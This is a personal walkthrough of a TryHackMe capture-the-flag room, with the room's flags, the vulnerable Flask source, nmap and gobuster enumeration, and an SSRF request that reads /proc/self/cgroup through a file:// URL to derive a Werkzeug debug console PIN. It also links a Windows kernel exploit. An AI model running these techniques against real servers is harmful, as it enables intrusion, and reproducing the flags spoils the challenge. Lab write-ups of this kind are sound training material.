---
cssclasses:
  - jbm-note
Date: 2026-06-21
tags:
  - THMChallenge
---
# **RCE** Challenge

| **Target** :LiTarget:            | *Try hack me machine(room:plantphotographer)* |
| -------------------------------- | --------------------------------------------- |
| Date :LiCalendar:                | 21/06/2026                                    |
| Main attack type                 | Python scripting                              |
| Secondary attack type            | RCE                                           |
| Tools :LiToolCase:               | NMAP, Python scripting, GOBUSTER              |
| Criticality :RiAlarmWarningLine: | **9**, **Critical** - RCE                     |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. What API key is used to retrieve files from the secure storage service?
	- *THM{Hello_Im_just_an_API_key}*
2. What flag is stored in a text file in the server's web directory?
	- *thm{c4n_i_haz_flagz_plz?}*
3. What flag is stored in a text file in the server's web directory?
	- *THM{SSRF2RCE_2_1337_4_M3}*
---
# Preparation
---
## Resources
- Resources / Information provided in-room
- [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip) - Python exploit script
- RDP Software : `xfreerdp`
## Python script
```python
import os
import pycurl
from io import BytesIO
from flask import Flask, send_from_directory, render_template, request, redirect, url_for, Response

app = Flask(__name__, static_url_path='/static')

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server = request.args.get('server','')

    if file_id!='':
        filename = str(int(file_id)) + '.pdf'

        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
        crl.perform()
        crl.close()
        file_data = response_buf.getvalue()

        resp = Response(file_data)
        resp.headers['Content-Type'] = 'application/pdf'
        resp.headers['Content-Disposition'] = 'attachment'
        return resp
    else:
        return 'No file selected... '

@app.route('/public-docs-k057230990384293/<path:path>')
def public_docs(path):
    return send_from_directory('public-docs', path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)
```

---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
#### Simple scan
```bash
sudo nmap -sS TARGET
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
#### ALL Ports
```bash
sudo nmap -sS -p- TARGET
```
```
unnecessary
```
### GOBUSTER
#### Hidden endpoint
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```
```
retro
```
```
gobuster dir -u http://TARGET/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```
```
download             (Status: 200) [Size: 20]
admin                (Status: 200) [Size: 48]
console              (Status: 200) [Size: 1985]
```

## **Vulnerability scanning**
### Research
- Python server pin generation
	- [Hack tricks `werkzeug` pen-testing](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)
---
# Exploiting and Investigation
---
## Enumerating the server

The server hosts a python web server with the `werkzeug` library. It has a hidden admin panel (only accessible through localhost) and a console that requires a pin to access.

## Gaining access to the server / console

```http
/download?server=file:///proc/self/cgroup%23&id=1
```

```
12:memory:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```
```
77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```

Running the code gives us the pin:
**Pin** :
```
110-688-511
```